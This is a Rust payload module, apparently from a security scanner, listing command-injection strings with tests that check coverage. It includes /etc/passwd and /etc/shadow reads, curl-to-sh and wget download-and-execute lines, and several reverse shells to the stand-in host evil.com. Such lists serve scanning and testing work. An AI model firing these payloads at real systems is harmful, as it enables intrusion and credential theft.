use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    payload_vec!(PayloadType::Cmd,
        "linux", [
            (";cat /etc/passwd", "Command injection - semicolon cat passwd", Severity::Critical),
            ("|cat /etc/passwd", "Command injection - pipe cat passwd", Severity::Critical),
            ("`cat /etc/passwd`", "Command injection - backtick command substitution", Severity::Critical),
            ("$(cat /etc/passwd)", "Command injection - $() command substitution", Severity::Critical),
            ("&& cat /etc/passwd", "Command injection - double ampersand", Severity::Critical),
            ("|| cat /etc/passwd", "Command injection - double pipe", Severity::Critical),
            ("|whoami", "Command injection - pipe whoami", Severity::Critical),
            (";whoami", "Command injection - semicolon whoami", Severity::Critical),
            ("\nwhoami\n", "Command injection - newline injection", Severity::Critical),
            ("%0awhoami%0a", "Command injection - URL encoded newlines", Severity::Critical),
            ("id", "Command injection - basic id command", Severity::Critical),
            ("&& id", "Command injection - double ampersand id", Severity::Critical),
            ("|id", "Command injection - pipe id", Severity::Critical),
            (";id", "Command injection - semicolon id", Severity::Critical),
            ("id;uname -a", "Command injection - multiple commands", Severity::Critical),
            ("cat /etc/shadow", "Command injection - read shadow file", Severity::Critical),
            ("ls -la /", "Command injection - list root directory", Severity::High),
            ("uname -a", "Command injection - system info", Severity::High),
            ("cat /proc/version", "Command injection - kernel version", Severity::High),
            ("env", "Command injection - environment variables", Severity::High),
        ];
        "rce", [
            ("curl -fsSL https://evil.com/shell.sh | sh", "Command injection - remote code download", Severity::Critical),
            ("wget https://evil.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh", "Command injection - wget download and execute", Severity::Critical),
            ("bash -i >& /dev/tcp/evil.com/4444 0>&1", "Command injection - reverse shell", Severity::Critical),
            ("nc -e /bin/sh evil.com 4444", "Command injection - netcat reverse shell", Severity::Critical),
            ("python -c 'import socket,subprocess,os;s=socket.socket()'", "Command injection - python reverse shell start", Severity::Critical),
            ("php -r '$sock=fsockopen(\"evil.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "Command injection - PHP reverse shell", Severity::Critical),
            ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc evil.com 4444 >/tmp/f", "Command injection - named pipe reverse shell", Severity::Critical),
        ];
        "test", [
            ("echo test", "Command injection - basic echo test", Severity::Medium),
            ("|echo test", "Command injection - piped echo", Severity::Medium),
            (";echo test", "Command injection - semicolon echo", Severity::Medium),
            ("ls", "Command injection - basic ls", Severity::Low),
        ];
        "newline", [
            ("\nid\n", "Command injection - newline id injection", Severity::Critical),
            ("\ncurl http://evil.com/shell.sh | sh\n", "Command injection - newline reverse shell", Severity::Critical),
        ];
        "encoding", [
            ("%0acat%20/etc/passwd%0a", "Command injection - URL encoded cat passwd", Severity::Critical),
            ("%09id%09", "Command injection - tab encoded id", Severity::High),
        ];
        "windows", [
            ("dir", "Command injection - Windows dir", Severity::High),
            ("type C:\\Windows\\win.ini", "Command injection - Windows read file", Severity::High),
            ("cmd /c dir", "Command injection - Windows cmd.exe", Severity::High),
            ("cmd /c whoami", "Command injection - Windows whoami", Severity::Critical),
            ("cmd /c ipconfig", "Command injection - Windows ipconfig", Severity::High),
            ("| powershell -Command \"whoami\"", "Command injection - PowerShell whoami", Severity::Critical),
            ("& whoami &", "Command injection - Windows ampersand chain", Severity::Critical),
        ];
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(
            !payloads.is_empty(),
            "Command injection payloads must not be empty"
        );
    }

    #[test]
    fn all_payloads_are_cmd_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Cmd);
        }
    }

    #[test]
    fn contains_shell_metacharacters() {
        let payloads = get_payloads();
        let has_semicolon = payloads.iter().any(|p| p.payload.contains(';'));
        let has_pipe = payloads.iter().any(|p| p.payload.contains('|'));
        let has_backtick = payloads.iter().any(|p| p.payload.contains('`'));
        let has_dollar_paren = payloads.iter().any(|p| p.payload.contains("$("));
        assert!(has_semicolon, "Must contain semicolon (;) injection");
        assert!(has_pipe, "Must contain pipe (|) injection");
        assert!(has_backtick, "Must contain backtick (`) injection");
        assert!(has_dollar_paren, "Must contain $() command substitution");
    }

    #[test]
    fn contains_etc_passwd_read() {
        let payloads = get_payloads();
        let has_passwd = payloads.iter().any(|p| p.payload.contains("/etc/passwd"));
        assert!(has_passwd, "Must contain /etc/passwd read payloads");
    }

    #[test]
    fn contains_reverse_shell() {
        let payloads = get_payloads();
        let has_reverse = payloads.iter().any(|p| {
            p.payload.contains("/dev/tcp")
                || p.payload.contains("nc -e")
                || p.payload.contains("fsockopen")
        });
        assert!(has_reverse, "Must contain reverse shell payloads");
    }

    #[test]
    fn contains_windows_commands() {
        let payloads = get_payloads();
        let has_windows = payloads
            .iter()
            .any(|p| p.payload.contains("cmd /c") || p.payload.contains("powershell"));
        assert!(
            has_windows,
            "Must contain Windows command injection payloads"
        );
    }

    #[test]
    fn almost_all_critical() {
        let payloads = get_payloads();
        let critical_count = payloads
            .iter()
            .filter(|p| p.severity == Severity::Critical)
            .count();
        let ratio = critical_count as f64 / payloads.len() as f64;
        assert!(
            ratio >= 0.6,
            "At least 60% of cmd payloads should be Critical, got {:.0}%",
            ratio * 100.0
        );
    }

    #[test]
    fn contains_chained_commands() {
        let payloads = get_payloads();
        let has_and = payloads.iter().any(|p| p.payload.contains("&&"));
        let has_double_pipe = payloads.iter().any(|p| p.payload.contains("||"));
        assert!(has_and, "Must contain && chaining");
        assert!(has_double_pipe, "Must contain || chaining");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 20,
            "Must have substantial cmd injection coverage, got {}",
            payloads.len()
        );
    }
}
